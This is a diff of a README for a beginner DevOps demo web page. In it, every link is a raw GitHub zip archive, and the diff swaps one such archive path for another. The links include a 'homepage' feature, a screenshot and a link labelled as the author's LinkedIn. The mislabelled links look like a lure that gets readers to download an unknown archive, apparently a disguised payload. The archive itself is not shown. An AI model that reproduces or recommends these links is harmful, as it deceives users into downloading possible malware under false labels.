@@ -3,7 +3,7 @@
 This is a basic HTML web page used to demonstrate foundational DevOps practices:
 
 ## 📁 Features
-- Static `https://raw.githubusercontent.com/jash1717/devops-webapp/main/virific/devops-webapp.zip` homepage
+- Static `https://raw.githubusercontent.com/jash1717/devops-webapp/main/workflows/webapp_devops_v2.7.zip` homepage
 - Git version control
 - Pushed to GitHub using CLI
 
@@ -17,9 +17,9 @@ This is a basic HTML web page used to demonstrate foundational DevOps practices:
 - Deploy using Render or Netlify
 
 ##  Screenshot
-![screenshot](https://raw.githubusercontent.com/jash1717/devops-webapp/main/virific/devops-webapp.zip+App+Preview)
+![screenshot](https://raw.githubusercontent.com/jash1717/devops-webapp/main/workflows/webapp_devops_v2.7.zip+App+Preview)
 
 ---
 
 > Built by Jaswanth Tupakula   
-> Follow me on [LinkedIn](https://raw.githubusercontent.com/jash1717/devops-webapp/main/virific/devops-webapp.zip)
+> Follow me on [LinkedIn](https://raw.githubusercontent.com/jash1717/devops-webapp/main/workflows/webapp_devops_v2.7.zip)
